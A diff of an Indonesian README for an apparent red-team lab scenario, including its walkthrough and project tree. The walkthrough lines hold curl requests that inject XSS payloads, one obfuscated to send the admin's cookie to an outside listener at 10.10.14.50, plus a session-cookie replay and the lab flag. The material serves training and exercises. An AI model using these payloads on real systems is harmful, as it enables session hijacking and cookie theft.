@@ -48,7 +48,7 @@ curl -i -X POST http://<IP>:3075/feedback -d "name=a&message=<script>alert(1)</s
 curl -i -X POST http://<IP>:3075/feedback --data-urlencode "name=a" \
   --data-urlencode "message=<svg onload=\"fetch('http://10.10.14.50:9000/c?d='+window['docu'+'ment']['coo'+'kie'])\">"
 # admin-bot membuka /dashboard -> XSS exfil cookie adm_sess -> replay:
-curl -i http://<IP>:3075/dashboard -H "Cookie: session=adm_sess_<curian>"
+curl -i http://<IP>:3075/dashboard -H "Cookie: sess=adm_sess_<curian>"
 # Flag: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
 ```
 
@@ -79,6 +79,5 @@ sudo bash scripts/reset.sh
 │   └── reset.sh          reset state untuk demo
 ├── cloud-init/user-data  provisioning otomatis Proxmox
 ├── docker-compose.yml
-├── SUBMISSION.md         dokumen submission (jawaban tertulis)
-└── SUBMISSION_appendix.md  lampiran source code lengkap
+└── SUBMISSION.md         dokumen submission (jawaban tertulis + walkthrough)
 ```
